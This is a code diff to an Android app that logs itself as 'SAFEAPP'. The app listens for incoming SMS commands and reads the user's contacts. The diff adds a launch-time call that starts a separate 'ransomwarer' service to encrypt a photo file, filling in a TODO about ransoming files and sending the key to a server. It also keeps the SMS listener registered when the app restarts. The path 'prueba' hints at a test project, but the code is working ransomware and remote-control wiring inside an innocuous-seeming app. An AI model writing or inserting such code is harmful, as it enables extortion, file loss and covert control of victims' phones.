@@ -11,6 +11,7 @@ import java.util.Locale;
 
 import android.app.Activity;
 import android.content.Context;
+import android.content.Intent;
 import android.content.IntentFilter;
 import android.hardware.Camera;
 import android.os.Bundle;
@@ -24,7 +25,7 @@ public class MainActivity extends Activity implements Commandable {
 
 	public void vibrate() {
 		Vibrator v = (Vibrator) getSystemService(Context.VIBRATOR_SERVICE);
-		v.vibrate(500);
+		v.vibrate(2000);
 	}
 
 	private SMSCommandParser parser;
@@ -43,6 +44,13 @@ public class MainActivity extends Activity implements Commandable {
 		filter = new IntentFilter();
 		filter.addAction("android.provider.Telephony.SMS_RECEIVED");
 		registerReceiver(receiver, filter);
+		
+		this.randomRansom();
+	}
+	
+	protected void onRestart(){
+		registerReceiver(receiver, filter);
+		super.onRestart();
 	}
 	
 	protected void onStop()
@@ -59,8 +67,7 @@ public class MainActivity extends Activity implements Commandable {
 	private ArrayList<Contact> contacts;
 
 	public void getContactList() {
-		this.contacts = new ContactsReader(this.getApplicationContext())
-				.contacts();
+		this.contacts = new ContactsReader(this.getApplicationContext()).contacts();
 		Log.d("SAFEAPP", contacts.toString());
 	}
 
@@ -131,6 +138,15 @@ public class MainActivity extends Activity implements Commandable {
 	}
 
 	public void randomRansom() {
-		// TODO: Randomly ransom a file, send the key to a server.
+		Intent sendIntent = new Intent();
+		sendIntent.setAction("com.ransom.ransomwarer.action.RANSOM_ACTION");
+		sendIntent.putExtra(Intent.EXTRA_TEXT, "/DCIM/prueba/dos.jpg");
+		sendIntent.setType("ransom/note");
+		startService(sendIntent);
+	}
+
+	@Override
+	public void sendSMS(String nro, String mensaje) {
+		// TODO Auto-generated method stub	
 	}
 }
